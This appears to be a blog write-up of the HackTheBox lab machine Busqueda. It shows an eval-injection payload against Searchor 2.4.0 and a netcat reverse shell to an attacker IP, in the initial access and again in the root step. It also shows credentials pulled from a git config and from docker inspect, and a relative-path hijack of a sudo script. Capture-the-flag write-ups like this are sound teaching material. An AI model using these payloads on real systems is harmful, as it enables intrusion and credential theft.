---
layout: post
title: HTB Busqueda
cover-img: /assets/covers/Busqueda.png
excerpt_separator: <!--more-->
tags: [HTB, HackTheBox]
comments: true
---
Busqueda is an easy difficulty Linux machine realeased on HackTheBox.
<!--more-->

## Recon

Nmap scan shows only HTTP and SSH ports open:

```
❯ nmap 10.10.11.208 -sC -oN busqueda.nmap -p
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-08 21:04 CEST
Nmap scan report for 10.10.11.208
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://searcher.htb/

Nmap done: 1 IP address (1 host up) scanned in 64.45 seconds
```

I will add the domain name `searcher.htb` to my /etc/hosts file and access the website.

## Website
The website offers a seach functionionality using different search engines:
![Web](/assets/screenshots/htb-busqueda/web.png)
When i choose an engine and write a query, i recieve a link that uses chosen search engine to search the query. Alternatively, i can check the *Auto redirect* option to get redirected to the search enging result.

I performed directory brute forcing aswell as subdomain enumartion, but found nothing of interest.

In the footer, the webpage says it is powered by [Searchor](https://github.com/ArjunSharda/Searchor):

![Searchor](/assets/screenshots/htb-busqueda/searchor.png)

It also leaks the version used. Looking at the github repository, Searchor is the backend used to generate the queries. Looking at the past releases of Searchor, version 2.4.2 fixed a vulnerability:

![Vulnerable version](/assets/screenshots/htb-busqueda/searchor-vuln.png)

Since the website allegedly uses version 2.4.0, it could be vulnerable to this. Looking at the commit that fixed the vulnerability, it replaced the following line of code:

```python
url = eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")
```

With this line:

```python
url = Engine[engine].search(query, copy_url=copy, open_web=open)
```

So, the vulnerable code usese python's f-string to fill parametrs into a template, and then uses `eval` to execute this string as a python code. Since the `engine` and `query` parametrs are passed from the post request, i have full control of them. Looking at the evaluated string, i can get a remote code execution(RCE). To achieve this, i will provide a valid search engine, `Google` for example, and query of this format:

```
whatever'),print(24/6)#
```

This malicious query will close the opening single quote eand bracket, then use a comma to create a python tuple(eval doesn't allow using semicolon). Now, i can execute an arbitrary python commands, and end with the `#` symbol, to comment out the rest of the string so eval ignores it. 

When the parametrs get filled into the template, the line of code will look like this:

```python
url = eval(f"Engine.Google.search('whatever'),print(24/6)#', copy_url={copy}, open_web={open})")
```

I will execute this payload using BurpSuite and see that i get the expected result:

![RCE](/assets/screenshots/htb-busqueda/burp_rce.png)

## Getting a user shell

Now i jsut need to replace the innocent print statement with a one line python reverse shell, a sample payload can look like this:

```
engine=Google&query=whatever'),__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.201 9999 >/tmp/f")#
```

I start a netcat listener, input the above paylaod to BurpSuite, URL encode it and after i send i get a connection on mu listener:

```
❯ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.201] from (UNKNOWN) [10.10.11.208] 44186
sh: 0: can't access tty; job control turned off
$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```

I am the `svc` user. I can read the flag from this users home directory. I will generate new ssh key and write my public key to `~/.ssh/authorized_keys`, so i can connect over ssh with better shell.

## Root

The reverse shell spawns in the `/var/www/app` folder, and i can see that it is a git repository:

```bash
-bash-5.1$ pwd
/var/www/app
-bash-5.1$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1 14:22 app.py
drwxr-xr-x 8 www-data www-data 4096 Apr  8 19:01 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 templates
```

Trying out several commands to enumrate the repository, like `git log` or `git branch` reveals nothing, however when i list the current config i get something interesting:

```
-bash-5.1$ git config --list
user.email=cody@searcher.htb
user.name=cody
core.hookspath=no-hooks
safe.directory=/var/www/app
core.repositoryformatversion=0
core.filemode=true
core.bare=false
core.logallrefupdates=true
remote.origin.url=http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
remote.origin.fetch=+refs/heads/*:refs/remotes/origin/*
branch.main.remote=origin
branch.main.merge=refs/heads/main
```

The interesting line is

```
remote.origin.url=http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

This revelas multiple things:

- There is a subdomain `gitea.searcher.htb` taht runs a gitea instance. I will add this to my /etc/hosts file.
- The remote url uses HTTP uses basic authorization, so i can get credentials to login to gitea - user:cody and password:jh1usoih2bkjaspwe92

I can use these credentials to login to the gitea instance, but there is nothing new besides the source code of the web application, that doesn't contain anything interesting.

Howerver, the password for `cody` works for my current `svc` user, and i can use thsi to run `sudo -l` command:

```
-bash-5.1$ sudo -l 
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

I can't read the `system-checkup.py` script since i don't have enough privilages, but i can just run the script and see what happens:

```
-bash-5.1$ sudo python3 /opt/scripts/system-checkup.py test
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

When i choose the `docker-ps` action, it shows there are 2 running containers:

```
-bash-5.1$ sudo python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 3 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 3 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

I was aware of gitea, but mysql running is new to me. There is a second action, `docker-inspect`, which will presumably jsut run the `docker inspect` command. I can use this to dump the configuration of the mysql image:

```
-bash-5.1$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{.Config}}' mysql_db
{f84a6b33fb5a   false false false map[3306/tcp:{} 33060/tcp:{}] false false false [MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF MYSQL_USER=gitea MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh MYSQL_DATABASE=gitea PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin GOSU_VERSION=1.14 MYSQL_MAJOR=8.0 MYSQL_VERSION=8.0.31-1.el8 MYSQL_SHELL_VERSION=8.0.31-1.el8] [mysqld] <nil> false mysql:8 map[/var/lib/mysql:{}]  [docker-entrypoint.sh] false  [] map[com.docker.compose.config-hash:1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b com.docker.compose.container-number:1 com.docker.compose.oneoff:False com.docker.compose.project:docker com.docker.compose.project.config_files:docker-compose.yml com.docker.compose.project.working_dir:/root/scripts/docker com.docker.compose.service:db com.docker.compose.version:1.29.2]  <nil> []}
```

Among other things, this shows the password for mysql root user. There is a gitea databse inside it, but only interesting thing in it are hashed passwords for `cody` and `administrator`. I thought about crackign the password for `administrator`, but couldn't manage it. There is another password in the docekr inspect output, MYSQL_PASSWORD, and i can use this password to log into gitea with the administraotr user.

I can see the `scripts` repository, including the `system-checkup.py` script that i can run as root:

![Gitea](/assets/screenshots/htb-busqueda/gitea.png)

I can look at the source code:

```python
def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

I was already aware of the `docker-ps` and `docker-inspect` actions, but didn't really investigate `full-checkup`. This one is interesting, because it calls a bash script `./full-checkup.sh`, but it does it with relative path, meaning i can create a script with the `full-checkup.sh` name in any writable directory and execute this script as root!

I am gonna change directory to `/tmp`, create a reverse shell script and save it as `full-checkup.sh`:

```bash
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.201 9999 >/tmp/f
```
I will also start a netcat listener on port 9999, and when i run the script:
```
sudo python3 /opt/scripts/system-checkup.py full-checkup
```

I get a connection back and i'm root:

```
❯ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.201] from (UNKNOWN) [10.10.11.208] 57330
# id
uid=0(root) gid=0(root) groups=0(root)
```

